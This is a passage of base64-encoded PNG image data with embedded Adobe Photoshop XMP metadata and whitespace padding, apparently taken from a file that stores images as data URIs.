AgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKPD94cGFja2V0IGVuZD0idyI/PtiHlsMAAAAJcEhZcwAACxMAAAsTAQCanBgAAAJ5UExURUdwTP///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////+bBLB4AAADSdFJOUwAK+gug/gP26FmQ+XY7rCHgERbF7k5Vf7sGCDI29B0kP9xDuCrPjykYZp2/ay3ScJgT+3vd/LlNF8kV8hv1p8uc8zVvldgPyEVeSuzV241d47wEkaTmK0LKqq4OHpS2PLdAaWqE5C+SJsLwzoPXfkgfKOvhiYByoyxGcYXlIlDEjDmwsmHUdC6lMDFbUpYzemTR/WPAYIoNXIezzAmG30s0ZXVoRNC6T/E4zQWpon1tqFNWAtmtJWLpSVHq2rFYjsMgr4hs+O1n3pMB0z4U5+8Zx8U3raoAAASZSURBVHja1d0HV1RHHAXwoS0s1aWjwYL0IhAjIEpHRECQagHEUIKaKPZGlGaKpkdTrenRFE00sSSaqOmJJvl/oszbzfGgKGyZmTf3foLfmTNn9r2582ZZ5FgDAwsRRYyEQ5FXcDMF1E8HIqeSPa3Bj0PNDEc+Xo9C/vuumcbexyCH0bg8VlMINTPsCTg/U3+y971mejTmiu7kl2lCXpsNNTMcie0NRyMTLcos0Jdc/WAzXc57BGyYjeQc8EIjE21fpiU5ejIzLXwzBWyYjQwXwJGpNuOAZuRumjpz81OxhtnILzFwZKLl7/ylDXknOZvQxWDDzBOUcQ6NzDOveosG5GaXzBSfngs2zDwbBz9BI/MsnWEuudgNMx0d9AEbZuPt1hqGRiYqW5toFnktuZ1A6wWsYbZv2UTBkfmLQP8N9eSFnpnp9fmzVJM/I0/zaUQC1Mxw5POG2yrJc0SYqbZCIdlGYlL3UjnUzHCkdL9FDblWnLmo5KAS8mISmQjrfqiZ4XjnSpbfzXkLNlNr5SnJ5K0kPrHrm5BmhiPHvoQj8we9r9qkkctJVr6ZCTbMRjfXuQyNzPPMbBnkD6WaKakyHGyYjX2mzCfQyHxS/yi4m2sgBfH99S2sYbZv2YhcPhaoMVOd7x5RZH9SluFDf6CRKeijF9HIRjfX04FGJvo5Jg6NTDRtdwIa2ejmnvNBI5Pfpn1oZKObe68NjWz8kufCkWlj+gtoZHs354NGJrpY74NG5g96R8rRyDyNiXBkopYKCxqZ/5JHTUcjE81pCUMj81/y+V1oZGP3IwGOTDQaXIBGJiqr8EIj8+Uj9Awamae06zgamS96l+DI/PEDjez/fC8WeVFxKtZcXpLfAbVi+OX0YK3LAWvCsH79pkUVYj1jBL5qwXpevpaI9bz8tDUO663kd6sX1Ltf3eoZWG/Yd9LAtl5891ZB7RbNSw/B2kbs2wW2WRsaYoPaX15evxKrePhtM1i9MzeriiGRV7yyF6uq/POWp+WqYvKGPQKOhSokb8uuFnK4oUgVeOiHdkFHSILUgFcJPBOlwhufKfL+nsPywbGBYs/3+Un2Bj0p/BSlXLB3sPCziCxEJnjdCRkngiVuAZbUgB0GfkrWZ2pfS1ojguV9VyfD+91QNNjnA8k2mWC2T7Q3Im2r5E9hxHoj895g0iNUXGqTD2bJ4rxJ0WpuDhLl9V/9AVMUQc8Rxequ3vlCBHhJ/rdMXUQ0XT8xpfF4Ubup+uKJPE+bLvXXA3nWdHVblIOZxX3vyXfNudXjrPtNl1kXvrgJ7nzbtKsIC93xfr/GzHuA+lwHB6Q1MTPjetN1tcpUMNvi4s/y7hBmdspcmhG7mAZxqenK1UE84nTT1b+S6REnP6XcvplpEyebLps+4utONF07B5hOmRK8aUccY0jkDVnaXWmcPXnTNcD0yyTgpYHtjCGRV+l6M3fMQ5quZxOYrnkgOKNZ51vmJ3oXiG+6hKZyYtN1mumd+5uuHfr/L8V4b1FSDdM/o+ObrhSGkLveRvU3SLqXpv+3AEuiGUr+dTRd/zCc2JuuFIaUyMaDDCv/AVp+8uqURLbyAAAAAElFTkSuQmCC", "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIUAAACFCAMAAABCBMsOAAADemlUWHRYTUw6Y29tLmFkb2JlLnhtcAAAAAAAPD94cGFja2V0IGJlZ2luPSLvu78iIGlkPSJXNU0wTXBDZWhpSHpyZVN6TlRjemtjOWQiPz4gPHg6eG1wbWV0YSB4bWxuczp4PSJhZG9iZTpuczptZXRhLyIgeDp4bXB0az0iQWRvYmUgWE1QIENvcmUgNS42LWMxMzIgNzkuMTU5Mjg0LCAyMDE2LzA0LzE5LTEzOjEzOjQwICAgICAgICAiPiA8cmRmOlJERiB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiPiA8cmRmOkRlc2NyaXB0aW9uIHJkZjphYm91dD0iIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtbG5zOnhtcD0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wLyIgeG1wTU06T3JpZ2luYWxEb2N1bWVudElEPSJ4bXAuZGlkOjg3NmJmYjVkLTViOWMtNGU3Ni1hMjdjLWFhMGIxODNiMDk5NyIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDoyMkRFOTRGQURBQkYxMUU2QjJBM0FCMTdFMkVERjQ2NiIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDoyMkRFOTRGOURBQkYxMUU2QjJBM0FCMTdFMkVERjQ2NiIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ0MgMjAxNS41IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6NzEzMWY5YWQtNTQyYS00MzNiLWE3MDctMDE2ZGE0NmI4MDM2IiBzdFJlZjpkb2N1bWVudElEPSJ4bXAuZGlkOjg3NmJmYjVkLTViOWMtNGU3Ni1hMjdjLWFhMGIxODNiMDk5NyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pjw3IqgAAAAZdEVYdFNvZnR3YXJlAEFkb2JlIEltYWdlUmVhZHlxyWU8AAACuFBMVEVHcEz//////////////////////////////////////////////////////////////////////////////////////////////////////////